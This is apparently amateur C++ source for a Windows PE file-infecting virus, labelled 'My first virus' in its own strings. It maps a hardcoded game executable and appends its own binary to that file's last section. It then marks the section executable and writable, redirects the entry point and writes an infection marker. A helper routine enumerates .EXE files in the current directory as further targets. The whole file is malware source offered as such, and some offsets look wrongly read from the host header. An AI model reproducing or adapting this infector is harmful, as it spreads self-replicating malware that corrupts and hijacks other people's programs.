#include <Windows.h>
#include <stdio.h>
#include <conio.h>

#define NTSIGNATURE(a) ((LPVOID)((BYTE *)a + ((PIMAGE_DOS_HEADER)a)->e_lfanew))
#define GETSIZEOFHEADERS(a) (*((DWORD*)(a + 0x54)))
#define ALIGN_DOWN(x, align) (x & ~(align - 1))
#define ALIGN_UP(x, align) ((x & (align - 1))?ALIGN_DOWN(x,align)+align:x)
#define OPT_SZ(p) (*((WORD*)(p + 0x14)))
#define NumOfSec(p) (*(WORD*)(p + 0x6))
#define pSectionTable(p) ((BYTE*)(p + 0x18 + OPT_SZ(p)))
#define pLastSection(p) (pSectionTable(p) + (NumOfSec(p) - 1) * 0x28)

wchar_t* CharToWchar(char*);
char* WcharToChar(wchar_t*);
bool FindFiles();

int main(int argc, char *argv[])
{
	//WIN32_FIND_DATA FindFileData;
	
	//Patient
	char chStr[38] = "c:\\Games\\PES 2011\\pes2011.EXE";
	//HANDLE hFind = FindFirstFile(CharToWchar(chStr), &FindFileData);
	long w;
	HANDLE hfPat = CreateFile(CharToWchar(chStr), 0xC0000000, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if(hfPat == INVALID_HANDLE_VALUE) {printf("Open file error!"); CloseHandle(hfPat); return 0; }
	w = SetFilePointer(hfPat, 0,0,FILE_END);
	HANDLE hMap = CreateFileMapping(hfPat, NULL, PAGE_READWRITE, 0, w, NULL);
	if(hMap==NULL) {printf("error - hMap"); CloseHandle(hfPat); return 0; }
	BYTE* hMapAddress = (BYTE*) MapViewOfFile(hMap, 0x02, 0, 0, w);
	if(!hMapAddress) {printf("error - hMapAddress");return 0;}

	BYTE* hPE = (BYTE*)NTSIGNATURE(hMapAddress);

	if(*((DWORD*)(hPE)) == IMAGE_NT_SIGNATURE) printf("\nsucces");
	else printf("\nerror PE");
	if(*((DWORD*)(hPE + 0x4C)) == 0x45673) {MessageBox(0,CharToWchar("virus"),CharToWchar("My first virus"),0); ExitProcess(NULL); }

	DWORD AEP_PAT = *((DWORD*)(hPE + 0x28)), FA = *((DWORD*)(hPE + 0x3C)), IB = *((DWORD*)(hPE + 0x34));

	
	//Virus
	HANDLE hfVir = CreateFile(CharToWchar(argv[0]), 0x80000000, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if(hfVir == INVALID_HANDLE_VALUE) {printf("Open vir file error!"); CloseHandle(hfVir); return 0; }
	w = SetFilePointer(hfVir, 0,0,FILE_END);
	HANDLE hMapVir = CreateFileMapping(hfVir, NULL, PAGE_READONLY, 0, w, NULL);
	if(hMapVir == NULL) {printf("error - hMap Vir"); CloseHandle(hfVir); return 0; }
	BYTE* hMapAddressVir = (BYTE*) MapViewOfFile(hMapVir, 0x04, 0, 0, w);
	if(!hMapAddressVir) {printf("error - hMapAddress Vir"); return 0;}

	BYTE* hPEVir = (BYTE*)NTSIGNATURE(hMapAddressVir);

	if(*((DWORD*)(hPEVir)) == IMAGE_NT_SIGNATURE) printf("\nsucces Vir");
	else printf("\nerror PEVir");

	DWORD AEP_VIR = *((DWORD*)(hPE + 0x28)), IS_VIR = *((DWORD*)(hPE + 0x50));
	
	// Infection

	BYTE* hLS = pLastSection(hPE);
	//printf("Pointer = %x\nVA = %x\nIS PAT = %x\nIS VIr = %x",*((DWORD*)(hLS + 0x14)),*((DWORD*)(hLS + 0x0C)),*((DWORD*)(hPE + 0x50)),*((DWORD*)(hPEVir + 0x50)));
	DWORD szRD = *((DWORD*)(hLS + 0x10)), newszRD = 0;
	newszRD = szRD + IS_VIR;
	newszRD = ALIGN_UP(newszRD, FA);
	*((DWORD*)(hLS + 0x10)) = newszRD;
	*((DWORD*)(hLS + 0x8)) = newszRD;

	DWORD ptrEndLS = szRD + *((DWORD*)(hLS + 0x14));
	DWORD newAEP = szRD + *((DWORD*)(hLS + 0x0C));
	*((DWORD*)(hPE + 0x28)) = newAEP + AEP_VIR;
	*((DWORD*)(hPE + 0x50)) = *((DWORD*)(hLS + 0x0C)) + newszRD;
	*((DWORD*)(hLS + 0x24)) = 0xA0000020;

	*((DWORD*)(hPE + 0x4C)) = 0x45673;

	SetFilePointer(hfPat, ptrEndLS, 0,FILE_BEGIN);
	SetFilePointer(hfVir, 0, 0,FILE_BEGIN);

	DWORD wr;
	char buf[1024];
	while(1)
	{
		ReadFile(hfVir,buf, 1024, &wr, NULL);
		WriteFile(hfPat, buf, wr, &wr, NULL);
		if(wr < 1024) break;
	};
	*((DWORD*)(hPE + 0x34 + ptrEndLS)) = ptrEndLS;
	//Close Handles
	
	UnmapViewOfFile(hMapAddress);
	CloseHandle(hfPat);
	UnmapViewOfFile(hMapAddressVir);
	CloseHandle(hfVir);
	//if (!FindFiles()) return 0;
	getch();
	return 1;	

}

wchar_t* CharToWchar(char *temp)
{
	int len = strlen(temp) + 1;
	wchar_t *wStr = new wchar_t[len];
	::MultiByteToWideChar(CP_ACP,NULL,temp,-1,wStr,len);
	return wStr;
}

char* WcharToChar(wchar_t *temp)
{
	int len = 0;
	while(temp[len])
		len++;
	char *Str = new char[len+1];
	::WideCharToMultiByte(1251,NULL,temp,-1,Str,len,NULL,NULL);
	Str[len] = '\0';
	return Str;
}

bool FindFiles()
{
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = INVALID_HANDLE_VALUE;
    wchar_t DirSpec[MAX_PATH];  // directory specification
    DWORD dwError;
	DWORD BufSize = MAX_PATH;
    //path[strlen(path)-10] = '\0';
	GetCurrentDirectory(BufSize, DirSpec);
    printf ("\nTarget directory is %s\n", WcharToChar(DirSpec));
    //strncpy (DirSpec, path, strlen(path)+1);
    wcscat(DirSpec, CharToWchar("\\*.EXE"));

    hFind = FindFirstFile(DirSpec, &FindFileData);

    if (hFind == INVALID_HANDLE_VALUE) 
    {
       printf ("Invalid file handle. Error is %u\n", GetLastError());
       return false;
    } 
    else 
    {
		printf ("First file name is %s\nFile size = %x\n", WcharToChar(FindFileData.cFileName), FindFileData.nFileSizeLow);
       while (FindNextFile(hFind, &FindFileData) != 0) 
       {
          printf ("Next file name is %s\nFile size = %x\n", WcharToChar(FindFileData.cFileName), FindFileData.nFileSizeLow);
       }
    
       dwError = GetLastError();
       FindClose(hFind);
       if (dwError != ERROR_NO_MORE_FILES) 
       {
          printf ("FindNextFile error. Error is %u\n", dwError);
          return false;
       }
    }
    return true;
}